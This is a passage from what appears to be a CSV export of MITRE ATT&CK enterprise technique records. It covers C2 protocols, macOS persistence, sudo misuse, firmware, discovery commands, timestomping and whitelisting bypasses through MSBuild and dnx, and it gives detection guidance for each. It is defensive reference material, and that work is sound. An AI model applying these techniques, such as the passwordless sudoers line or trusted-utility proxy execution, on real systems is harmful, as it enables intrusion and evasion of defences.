Detection: SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels. (Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. (Citation: SEI SSL Inspection Risks)

If malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Malware reverse engineering, Process use of network, Process monitoring, SSL/TLS inspection

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1032', 'external_id': 'T1032'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}, {'source_name': 'SANS Decrypting SSL', 'description': 'Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.', 'url': 'http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840'}, {'source_name': 'SEI SSL Inspection Risks', 'description': 'Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.', 'url': 'https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html'}, {'source_name': 'Fidelis DarkComet', 'description': 'Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for a DarkComet. Retrieved April 5, 2016.', 'url': 'https://www.fidelissecurity.com/sites/default/files/FTA%201018%20looking%20at%20the%20sky%20for%20a%20dark%20comet.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b","2017-05-31T21:31:10.728Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Standard Non-Application Layer Protocol","Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), and transport layer protocols, such as the User Datagram Protocol (UDP).

ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.

Detection: Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1095', 'external_id': 'T1095'}, {'source_name': 'Wikipedia OSI', 'description': 'Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved December 4, 2014.'}, {'source_name': 'Microsoft ICMP', 'description': 'Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics. Retrieved December 1, 2014.', 'url': 'http://support.microsoft.com/KB/170292'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--2ba5aa71-9d15-4b22-b726-56af06d9ad2f","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Startup Items","Per Apple’s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items (Citation: Startup Items). This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, `/Library/StartupItems` isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), `StartupParameters.plist`, reside in the top-level directory. 

An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.

Detection: The `/Library/StartupItems` folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist. Monitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.

Platforms: macOS

Data Sources: File monitoring, Process Monitoring

Effective Permissions: root

Permissions Required: Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1165', 'external_id': 'T1165'}, {'source_name': 'Startup Items', 'description': 'Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.', 'url': 'https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html'}, {'source_name': 'Methods of Mac Malware Persistence', 'description': 'Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.', 'url': 'https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring']","['Administrator']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","['root']","","","",""
"attack-pattern","attack-pattern--9e80ddfb-ce32-4961-a778-ca6a10cfae72","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Sudo","The sudoers file, `/etc/sudoers`, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like `user1 ALL=(ALL) NOPASSWD: ALL` (Citation: OSX.Dok Malware). 

Adversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.

Detection: On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).

Platforms: Linux, macOS

Data Sources: File monitoring

Effective Permissions: root

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1169', 'external_id': 'T1169'}, {'source_name': 'OSX.Dok Malware', 'description': 'Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.', 'url': 'https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring']","['User']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","['root']","","","",""
"attack-pattern","attack-pattern--6856ddd6-2df3-4379-8b87-284603c189c3","2017-05-31T21:30:28.613Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","System Firmware","The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)

System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.

Detection: System firmware manipulation may be detected. (Citation: MITRE Trustworthy Firmware Measurement) Dump and inspect BIOS images on vulnerable systems and compare against known good images. (Citation: MITRE Copernicus) Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.

Likewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. (Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit)

Platforms: Windows

Data Sources: API monitoring, BIOS, EFI

Permissions Required: Administrator, SYSTEM

Contributors: Ryan Becwar, McAfee","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1019', 'external_id': 'T1019'}, {'source_name': 'Wikipedia BIOS', 'description': 'Wikipedia. (n.d.). BIOS. Retrieved January 5, 2016.', 'url': 'https://en.wikipedia.org/wiki/BIOS'}, {'source_name': 'Wikipedia UEFI', 'description': 'Wikipedia. (2017, July 10). Unified Extensible Firmware Interface. Retrieved July 11, 2017.', 'url': 'https://en.wikipedia.org/wiki/Unified%20Extensible%20Firmware%20Interface'}, {'source_name': 'About UEFI', 'description': 'UEFI Forum. (n.d.). About UEFI Forum. Retrieved January 5, 2016.', 'url': 'http://www.uefi.org/about'}, {'source_name': 'MITRE Trustworthy Firmware Measurement', 'description': 'Upham, K. (2014, March). Going Deep into the BIOS with MITRE Firmware Security Research. Retrieved January 5, 2016.', 'url': 'http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research'}, {'source_name': 'MITRE Copernicus', 'description': 'Butterworth, J. (2013, July 30). Copernicus: Question Your Assumptions about BIOS Security. Retrieved December 11, 2015.', 'url': 'http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/copernicus-question-your-assumptions-about'}, {'source_name': 'McAfee CHIPSEC Blog', 'description': 'Beek, C., Samani, R. (2017, March 8). CHIPSEC Support Against Vault 7 Disclosure Scanning. Retrieved March 13, 2017.', 'url': 'https://securingtomorrow.mcafee.com/business/chipsec-support-vault-7-disclosure-scanning/'}, {'source_name': 'Github CHIPSEC', 'description': 'Intel. (2017, March 18). CHIPSEC Platform Security Assessment Framework. Retrieved March 20, 2017.', 'url': 'https://github.com/chipsec/chipsec'}, {'source_name': 'Intel HackingTeam UEFI Rootkit', 'description': ""Intel Security. (2005, July 16). HackingTeam's UEFI Rootkit Details. Retrieved March 20, 2017."", 'url': 'http://www.intelsecurity.com/advanced-threat-research/content/data/HT-UEFI-rootkit.html'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'BIOS', 'EFI']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Ryan Becwar', 'McAfee']","","","","",""
"attack-pattern","attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1","2017-05-31T21:31:04.307Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","System Information Discovery","An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.

===Windows===

Example commands and utilities that obtain this information include `ver`, Systeminfo, and `dir` within cmd for identifying information based on present files and directories.

===Mac===

On Mac, the `systemsetup` command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the `system_profiler` gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: Process command-line parameters, Process monitoring

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1082', 'external_id': 'T1082'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process command-line parameters', 'Process monitoring']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0","2017-05-31T21:30:27.342Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","System Network Configuration Discovery","Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: Process command-line parameters, Process monitoring

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1016', 'external_id': 'T1016'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process command-line parameters', 'Process monitoring']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475","2017-05-31T21:30:45.139Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","System Network Connections Discovery","Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. 

===Windows===

Utilities and commands that acquire this information include netstat, ""net use,"" and ""net session"" with Net.

===Mac and Linux ===

In Mac and Linux, `netstat` and `lsof` can be used to list current connections. `who -a` and `w` can be used to show which users are currently logged in, similar to ""net session"".

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: Process command-line parameters, Process monitoring

Permissions Required: User, Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1049', 'external_id': 'T1049'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process command-line parameters', 'Process monitoring']","['User', 'Administrator']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104","2017-05-31T21:30:35.733Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","System Owner/User Discovery","===Windows===

Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs.

===Mac===

On Mac, the currently logged in user can be identified with `users`,`w`, and `who`.

===Linux===

On Linux, the currently logged in user can be identified with `w` and `who`.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Process command-line parameters

Permissions Required: User, Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1033', 'external_id': 'T1033'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring', 'Process command-line parameters']","['User', 'Administrator']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa","2017-05-31T21:30:21.315Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","System Service Discovery","Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are ""sc,"" ""tasklist /svc"" using Tasklist, and ""net start"" using Net, but adversaries may also use other tools as well.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Windows

Data Sources: Process command-line parameters, Process monitoring

Permissions Required: User, Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1007', 'external_id': 'T1007'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process command-line parameters', 'Process monitoring']","['User', 'Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077","2017-05-31T21:31:37.450Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","System Time Discovery","The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)

An adversary may gather the system time and/or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing `net time \\hostname` to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using `w32tm /tz`. (Citation: Technet Windows Time Service) The information could be useful for performing other techniques, such as executing a file with a Scheduled Task (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting.

Detection: Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.

Platforms: Windows

Data Sources: Process monitoring, Process command-line parameters, API monitoring

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1124', 'external_id': 'T1124'}, {'source_name': 'MSDN System Time', 'description': 'Microsoft. (n.d.). System Time. Retrieved November 25, 2016.', 'url': 'https://msdn.microsoft.com/ms724961.aspx'}, {'source_name': 'Technet Windows Time Service', 'description': 'Mathers, B. (2016, September 30). Windows Time Service Tools and Settings. Retrieved November 25, 2016.', 'url': 'https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings'}, {'source_name': ""RSA EU12 They're Inside"", 'description': 'Rivner, U., Schwartz, E. (2012). They’re Inside… Now What?. Retrieved November 25, 2016.', 'url': 'https://www.rsaconference.com/writable/presentations/file%20upload/ht-209%20rivner%20schwartz.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'Process command-line parameters', 'API monitoring']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c","2017-05-31T21:31:01.759Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Taint Shared Content","Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.

Detection: Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.

Platforms: Windows

Data Sources: File monitoring, Process monitoring

System Requirements: Access to shared folders and content with write permissions","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1080', 'external_id': 'T1080'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring']","","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Access to shared folders and content with write permissions']","","",""
"attack-pattern","attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414","2017-05-31T21:30:57.201Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Third-party Software","Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems, then they may be able to execute code.

Adversaries may gain access to and use third-party application deployment systems installed within an enterprise network. Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.

Detection: Detection methods will vary depending on the type of third-party software or system and how it is typically used. 

The same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. 

Often these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious.

Perform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.

Platforms: Linux, Windows, macOS

Data Sources: Binary file metadata, File monitoring, Process monitoring, Process use of network, Third-party application logs, Windows Registry

Permissions Required: Administrator, SYSTEM, User

Remote Support: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1072', 'external_id': 'T1072'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Binary file metadata', 'File monitoring', 'Process monitoring', 'Process use of network', 'Third-party application logs', 'Windows Registry']","['Administrator', 'SYSTEM', 'User']","['Linux', 'Windows', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","True","",""
"attack-pattern","attack-pattern--128c55d3-aeba-469f-bd3e-c8996ab4112a","2017-05-31T21:31:12.675Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Timestomp","Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name Masquerading to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)

Detection: Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.

Platforms: Linux, Windows

Data Sources: File monitoring, Process monitoring, Process command-line parameters

Defense Bypassed: Host forensic analysis

Permissions Required: User, Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1099', 'external_id': 'T1099'}, {'source_name': 'WindowsIR Anti-Forensic Techniques', 'description': 'Carvey, H. (2013, July 23). HowTo: Determine/Detect the use of Anti-Forensics Techniques. Retrieved June 3, 2016.', 'url': 'http://windowsir.blogspot.com/2013/07/howto-determinedetect-use-of-anti.html'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring', 'Process command-line parameters']","['User', 'Administrator', 'SYSTEM']","['Linux', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Host forensic analysis']"
"attack-pattern","attack-pattern--b53dbcc6-147d-48bb-9df4-bcb8bb808ff6","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Trap","The `trap` command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like `ctrl+c` and `ctrl+d`. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format `trap 'command list' signals` where ""command list"" will be executed when ""signals"" are received.

Detection: Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.

Platforms: Linux, macOS

Data Sources: File monitoring, Process Monitoring, Process command-line parameters

Permissions Required: User, Administrator

Remote Support: No","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1154', 'external_id': 'T1154'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring', 'Process command-line parameters']","['User', 'Administrator']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","False","",""
"attack-pattern","attack-pattern--ff25900d-76d5-449b-a351-8824e62fc81b","2017-05-31T21:31:39.262Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Trusted Developer Utilities","There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.

===MSBuild===

MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations. (Citation: MSDN MSBuild) 

Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file. (Citation: MSDN MSBuild) Inline Tasks MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)

===DNX===

The .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation: Microsoft Migrating from DNX) DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. 

An adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX. (Citation: engima0x3 DNX Bypass)

===RCSI===

The rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution. (Citation: Microsoft Roslyn CPT RCSI) The rcsi.exe binary is signed by Microsoft. (Citation: engima0x3 RCSI Bypass)

